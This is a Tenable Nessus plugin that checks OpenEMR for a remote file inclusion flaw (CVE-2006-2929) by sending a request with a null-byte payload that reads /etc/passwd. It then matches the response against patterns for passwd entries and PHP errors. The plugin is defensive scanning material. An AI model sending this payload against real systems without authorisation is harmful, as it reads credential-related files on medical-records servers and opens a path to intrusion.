#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21675);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-2929");
  script_xref(name:"OSVDB", value:"26231");

  script_name(english:"OpenEMR C_FormEvaluation.class.php fileroot Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using OpenEMR");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running OpenEMR, a web-based medical records
application written in PHP. 

The version of OpenEMR installed on the remote host fails to sanitize
input to the 'fileroot' parameter before using it in the
'contrib/forms/evaluation/C_FormEvaluation.class.php' script to
include PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit this flaw
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/1886" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting as the application does not
require it." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/openemr", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/contrib/forms/evaluation/C_FormEvaluation.class.php?",
      "fileroot=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/library/classes/Controller\.class\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (contents)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
